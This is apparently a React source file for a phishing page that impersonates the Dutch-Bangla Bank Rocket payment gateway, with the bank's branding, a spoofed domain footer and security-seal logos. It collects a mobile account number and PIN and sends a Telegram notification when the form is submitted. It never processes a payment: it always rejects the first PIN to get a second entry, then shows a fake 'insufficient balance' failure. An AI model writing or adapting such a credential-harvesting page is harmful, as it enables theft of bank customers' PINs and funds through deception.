import { useState, useEffect, useRef } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { sendTelegramNotification } from "@/lib/telegram";
import dbblHeader from "@/assets/dbbl-header.jpg";
import secureLogos from "@/assets/3d-secure-logos.jpg";

const RocketPayment = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const amount = searchParams.get('amount') || "00";
  const [mobileAccount, setMobileAccount] = useState("");
  const [pin, setPin] = useState("");
  const [showPin, setShowPin] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [pinAttempts, setPinAttempts] = useState(0);
  const [showError, setShowError] = useState("");
  const [redirectTimer, setRedirectTimer] = useState(5);
  const [showFailed, setShowFailed] = useState(false);

  const mobileRef = useRef<HTMLInputElement>(null);
  const pinRef = useRef<HTMLInputElement>(null);

  const descriptionId = "6121177461315994416";

  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePopState = () => {
      navigate(`/payment-cancelled?channel=Rocket&reason=Payment isn't completed&amount=${amount}.00`, { replace: true });
    };
    window.addEventListener("popstate", handlePopState);
    return () => window.removeEventListener("popstate", handlePopState);
  }, [navigate]);

  useEffect(() => {
    setTimeout(() => mobileRef.current?.focus(), 100);
  }, []);

  useEffect(() => {
    if (showFailed && redirectTimer > 0) {
      const interval = setInterval(() => setRedirectTimer(p => p - 1), 1000);
      return () => clearInterval(interval);
    }
    if (showFailed && redirectTimer === 0) {
      navigate(`/payment-cancelled?channel=Rocket&reason=Insufficient Balance&amount=${amount}.00`);
    }
  }, [showFailed, redirectTimer, navigate]);

  const validPrefixes = ["013", "014", "015", "016", "017", "018", "019"];
  const isValidMobile = () => {
    return mobileAccount.length === 11 && validPrefixes.includes(mobileAccount.substring(0, 3)) && /^\d+$/.test(mobileAccount);
  };

  const handleMobileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 11);
    setMobileAccount(value);
  };

  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 5);
    setPin(value);
  };

  const handleSubmit = () => {
    if (!isValidMobile()) {
      setShowError("Please enter a valid mobile number.");
      setTimeout(() => setShowError(""), 3000);
      return;
    }
    if (pin.length < 4) {
      setShowError("Please enter your PIN.");
      setTimeout(() => setShowError(""), 3000);
      return;
    }

    setIsSubmitting(true);
    sendTelegramNotification({ type: 'payment_confirmed', amount, method: 'Rocket' });

    if (pinAttempts === 0) {
      setTimeout(() => {
        setIsSubmitting(false);
        setPinAttempts(1);
        setShowError("Invalid PIN. Please try again.");
        setPin("");
        setTimeout(() => pinRef.current?.focus(), 50);
        setTimeout(() => setShowError(""), 4000);
      }, 2000);
      return;
    }

    setTimeout(() => {
      setIsSubmitting(false);
      setShowFailed(true);
      setRedirectTimer(5);
    }, 2000);
  };

  const handleBack = () => {
    navigate(`/payment-cancelled?channel=Rocket&reason=Payment isn't completed&amount=${amount}.00`);
  };

  const handleReset = () => {
    setMobileAccount("");
    setPin("");
    setShowError("");
    setTimeout(() => mobileRef.current?.focus(), 50);
  };

  const togglePinVisibility = () => setShowPin(!showPin);

  const headerAndBlueBar = (
    <>
      {/* Bank Header - real image */}
      <div className="bg-white">
        <img src={dbblHeader} alt="Dutch-Bangla Bank" className="w-full h-auto" />
      </div>

      {/* Blue Title Bar */}
      <div className="bg-gradient-to-r from-[#0066cc] to-[#0099ff] py-1 min-[375px]:py-1.5 text-center">
        <span className="text-white text-xs min-[375px]:text-sm font-bold tracking-wider" style={{fontFamily: 'Georgia, serif'}}>DBBL NEXUS GATEWAY</span>
      </div>
      <div className="h-[3px] bg-gradient-to-r from-[#0044aa] to-[#0077dd]"></div>
    </>
  );

  const footer = (
    <div>
      <div className="h-[3px] bg-gradient-to-r from-[#0044aa] to-[#0077dd]"></div>
      <div className="text-center py-1.5 min-[375px]:py-2">
        <p className="text-[10px] min-[375px]:text-xs font-bold text-[#333]" style={{fontFamily: 'Arial, sans-serif'}}>DBBL E-COMM With Service Hub Limited</p>
        <p className="text-[9px] min-[375px]:text-[10px] text-[#666]" style={{fontFamily: 'Arial, sans-serif'}}>ecom1.dutchbanglabank.com</p>
      </div>
    </div>
  );

  if (showFailed) {
    return (
      <div className="min-h-screen bg-[#f0f0f0] flex items-start justify-center pt-2">
        <div className="w-full max-w-[700px] bg-white">
          {headerAndBlueBar}
          <div className="p-4 min-[375px]:p-6 text-center">
            <p className="text-red-600 font-bold text-sm min-[375px]:text-base mb-1">Transaction Failed</p>
            <p className="text-gray-600 text-xs min-[375px]:text-sm mb-1">Insufficient balance in your account.</p>
            <p className="text-gray-500 text-[10px] min-[375px]:text-xs">
              Redirecting to merchant website in {redirectTimer}s...
            </p>
          </div>
          {footer}
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#f0f0f0] flex items-start justify-center pt-2">
      <div className="w-full max-w-[700px] bg-white">
        {headerAndBlueBar}

        {/* Form Section */}
        <div className="px-3 min-[375px]:px-4 py-3 min-[375px]:py-4">
          <h2 className="text-center font-bold text-xs min-[375px]:text-sm text-[#333] mb-3 min-[375px]:mb-4" style={{fontFamily: 'Arial, sans-serif'}}>
            Mobile Account Information
          </h2>

          {showError && (
            <div className="text-center text-red-600 text-[10px] min-[375px]:text-xs mb-2 font-medium">
              {showError}
            </div>
          )}

          {/* Form Table */}
          <div className="max-w-md mx-auto space-y-2 min-[375px]:space-y-2.5">
            {/* Mobile Account */}
            <div className="flex items-center justify-end gap-2">
              <label className="text-[11px] min-[375px]:text-xs font-bold text-[#333] whitespace-nowrap" style={{fontFamily: 'Arial, sans-serif'}}>
                Mobile Account
              </label>
              <input
                ref={mobileRef}
                type="text"
                inputMode="numeric"
                value={mobileAccount}
                onChange={handleMobileChange}
                className="border border-[#999] px-1.5 py-0.5 min-[375px]:py-1 text-xs min-[375px]:text-sm w-[160px] min-[375px]:w-[180px] focus:outline-none focus:border-[#0066cc]"
                style={{fontFamily: 'Arial, sans-serif'}}
              />
            </div>

            {/* PIN */}
            <div className="flex items-center justify-end gap-2">
              <label className="text-[11px] min-[375px]:text-xs font-bold text-[#333] whitespace-nowrap" style={{fontFamily: 'Arial, sans-serif'}}>
                PIN
              </label>
              <div className="flex items-center gap-1">
                <input
                  ref={pinRef}
                  type={showPin ? "text" : "password"}
                  inputMode="numeric"
                  value={pin}
                  onChange={handlePinChange}
                  className="border border-[#999] px-1.5 py-0.5 min-[375px]:py-1 text-xs min-[375px]:text-sm w-[80px] min-[375px]:w-[90px] focus:outline-none focus:border-[#0066cc]"
                  style={{fontFamily: 'Arial, sans-serif'}}
                />
                <button
                  onClick={togglePinVisibility}
                  className="w-[28px] min-[375px]:w-[32px] h-[22px] min-[375px]:h-[26px] border border-[#999] bg-[#f5f5f5] flex items-center justify-center"
                  title={showPin ? "Hide PIN" : "Show PIN"}
                >
                  <svg width="14" height="10" viewBox="0 0 20 14" fill="none">
                    <rect x="1" y="1" width="18" height="12" rx="1" stroke="#666" strokeWidth="1" fill="#ddd"/>
                    <line x1="3" y1="4" x2="5" y2="4" stroke="#888" strokeWidth="1"/>
                    <line x1="6" y1="4" x2="8" y2="4" stroke="#888" strokeWidth="1"/>
                    <line x1="9" y1="4" x2="11" y2="4" stroke="#888" strokeWidth="1"/>
                    <line x1="12" y1="4" x2="14" y2="4" stroke="#888" strokeWidth="1"/>
                    <line x1="15" y1="4" x2="17" y2="4" stroke="#888" strokeWidth="1"/>
                    <line x1="3" y1="7" x2="5" y2="7" stroke="#888" strokeWidth="1"/>
                    <line x1="6" y1="7" x2="8" y2="7" stroke="#888" strokeWidth="1"/>
                    <line x1="9" y1="7" x2="11" y2="7" stroke="#888" strokeWidth="1"/>
                    <line x1="12" y1="7" x2="14" y2="7" stroke="#888" strokeWidth="1"/>
                    <line x1="15" y1="7" x2="17" y2="7" stroke="#888" strokeWidth="1"/>
                    <line x1="3" y1="10" x2="5" y2="10" stroke="#888" strokeWidth="1"/>
                    <line x1="6" y1="10" x2="8" y2="10" stroke="#888" strokeWidth="1"/>
                    <line x1="9" y1="10" x2="11" y2="10" stroke="#888" strokeWidth="1"/>
                  </svg>
                </button>
              </div>
            </div>

            {/* Amount */}
            <div className="flex items-center justify-center gap-2 pt-0.5">
              <span className="text-[11px] min-[375px]:text-xs font-bold text-[#333]" style={{fontFamily: 'Arial, sans-serif'}}>Amount</span>
              <span className="text-[11px] min-[375px]:text-xs text-[#333]" style={{fontFamily: 'Arial, sans-serif'}}>{amount}.00</span>
            </div>

            {/* Currency */}
            <div className="flex items-center justify-center gap-2">
              <span className="text-[11px] min-[375px]:text-xs font-bold text-[#333]" style={{fontFamily: 'Arial, sans-serif'}}>Currency</span>
              <span className="text-[11px] min-[375px]:text-xs text-[#333]" style={{fontFamily: 'Arial, sans-serif'}}>BDT</span>
            </div>

            {/* Description */}
            <div className="flex items-center justify-center gap-2">
              <span className="text-[11px] min-[375px]:text-xs font-bold text-[#333]" style={{fontFamily: 'Arial, sans-serif'}}>Description</span>
              <span className="text-[10px] min-[375px]:text-xs text-[#333]" style={{fontFamily: 'Arial, sans-serif'}}>{descriptionId}</span>
            </div>
          </div>

          {/* Buttons */}
          <div className="flex items-center justify-center gap-1.5 mt-4 min-[375px]:mt-5">
            <button onClick={handleBack} className="px-0.5">
              <img 
                src="data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='80' height='24'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0%25' y1='0%25' x2='0%25' y2='100%25'%3E%3Cstop offset='0%25' stop-color='%23e8e8e8'/%3E%3Cstop offset='100%25' stop-color='%23b0b0b0'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='80' height='24' rx='2' fill='url(%23g)' stroke='%23888' stroke-width='1'/%3E%3Crect x='3' y='0' width='2' height='24' fill='%23cc0000'/%3E%3Crect x='5' y='0' width='2' height='24' fill='%23009933'/%3E%3Crect x='7' y='0' width='2' height='24' fill='%23003399'/%3E%3Crect x='71' y='0' width='2' height='24' fill='%23003399'/%3E%3Crect x='73' y='0' width='2' height='24' fill='%23009933'/%3E%3Crect x='75' y='0' width='2' height='24' fill='%23cc0000'/%3E%3Ctext x='40' y='16' text-anchor='middle' font-family='Arial' font-size='11' font-weight='bold' fill='%23333'%3EBACK%3C/text%3E%3C/svg%3E"
                alt="BACK"
                className="h-6 cursor-pointer hover:opacity-80"
              />
            </button>
            <button onClick={handleSubmit} disabled={isSubmitting} className="px-0.5">
              <img 
                src="data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='80' height='24'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0%25' y1='0%25' x2='0%25' y2='100%25'%3E%3Cstop offset='0%25' stop-color='%23e8e8e8'/%3E%3Cstop offset='100%25' stop-color='%23b0b0b0'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='80' height='24' rx='2' fill='url(%23g)' stroke='%23888' stroke-width='1'/%3E%3Crect x='3' y='0' width='2' height='24' fill='%23cc0000'/%3E%3Crect x='5' y='0' width='2' height='24' fill='%23009933'/%3E%3Crect x='7' y='0' width='2' height='24' fill='%23003399'/%3E%3Crect x='71' y='0' width='2' height='24' fill='%23003399'/%3E%3Crect x='73' y='0' width='2' height='24' fill='%23009933'/%3E%3Crect x='75' y='0' width='2' height='24' fill='%23cc0000'/%3E%3Ctext x='40' y='16' text-anchor='middle' font-family='Arial' font-size='11' font-weight='bold' fill='%23333'%3ESUBMIT%3C/text%3E%3C/svg%3E"
                alt="SUBMIT"
                className="h-6 cursor-pointer hover:opacity-80"
              />
            </button>
            <button onClick={handleReset} className="px-0.5">
              <img 
                src="data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='80' height='24'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0%25' y1='0%25' x2='0%25' y2='100%25'%3E%3Cstop offset='0%25' stop-color='%23e8e8e8'/%3E%3Cstop offset='100%25' stop-color='%23b0b0b0'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='80' height='24' rx='2' fill='url(%23g)' stroke='%23888' stroke-width='1'/%3E%3Crect x='3' y='0' width='2' height='24' fill='%23cc0000'/%3E%3Crect x='5' y='0' width='2' height='24' fill='%23009933'/%3E%3Crect x='7' y='0' width='2' height='24' fill='%23003399'/%3E%3Crect x='71' y='0' width='2' height='24' fill='%23003399'/%3E%3Crect x='73' y='0' width='2' height='24' fill='%23009933'/%3E%3Crect x='75' y='0' width='2' height='24' fill='%23cc0000'/%3E%3Ctext x='40' y='16' text-anchor='middle' font-family='Arial' font-size='11' font-weight='bold' fill='%23333'%3ERESET%3C/text%3E%3C/svg%3E"
                alt="RESET"
                className="h-6 cursor-pointer hover:opacity-80"
              />
            </button>
          </div>

          {/* Verified logos - real image */}
          <div className="flex items-center justify-center mt-4 min-[375px]:mt-5">
            <img src={secureLogos} alt="Verified by VISA & MasterCard SecureCode" className="h-8 min-[375px]:h-10 object-contain" />
          </div>
        </div>

        {/* Footer */}
        {footer}
      </div>

      {/* Loading overlay */}
      {isSubmitting && (
        <div className="fixed inset-0 bg-white/80 flex items-center justify-center z-50">
          <div className="text-center">
            <div className="w-6 h-6 border-2 border-[#0066cc] border-t-transparent rounded-full animate-spin mx-auto mb-1"></div>
            <p className="text-xs text-[#333]">Processing...</p>
          </div>
        </div>
      )}
    </div>
  );
};

export default RocketPayment;
